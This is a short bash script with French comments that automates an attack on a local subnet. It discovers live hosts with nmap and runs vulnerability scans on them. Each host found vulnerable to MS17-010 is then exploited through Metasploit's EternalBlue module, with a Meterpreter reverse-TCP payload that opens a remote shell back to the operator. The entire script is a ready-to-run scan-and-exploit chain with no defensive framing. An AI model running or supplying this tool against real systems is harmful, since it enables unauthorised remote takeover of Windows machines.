#!/bin/bash
#!/usr/bin/env python3

######################
###\ \##/ /#| |#/ /###
####\ \/ /##| |/ /####
#####\  /###| |\ \####
#####/ /####| |#\ \###
####/_/#####|_|##\_\##
######################

IP=$(ip addr show eth0 | awk '/inet / {print$2}' | cut -d/ -f1)

#Récupérer les hôtes actifs dans un sous-réseau
nmap -sn 192.168.100.0/24 | awk '/Nmap scan report for / {print $5}' > hostup.txt

#Compter le nombre de ligne dans un fichier
SEQ=$(wc -l hostup.txt | awk '{print $1}')

#Check des vulnérabilité sur chaque hôtes actifs
for i in $(seq 1 $SEQ);do
LINE=$(cat hostup.txt | awk "NR==$i") #Afficher la première ligne du fichier
nmap -v --script vuln $LINE > LINE$i.txt
done

#Vérifier qu'un hôte soit vulnérable a la faille MS17-010
STRING="| smb-vuln-ms17-010:"

for i in $(seq 1 $SEQ);do
LINE=$(cat hostup.txt | awk "NR==$i") #Afficher la première ligne du fichier

if [[ ! -z $(grep "$STRING" "LINE$i.txt") ]]; then
echo "$LINE is vulnerable to MS17-010";

#Execution de l'exploit
msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $IP ; set rhost $LINE ; exploit ; "

else
echo "$LINE is not vulnerable"; 
fi
done


rm hostup.txt
rm LINE*.txt
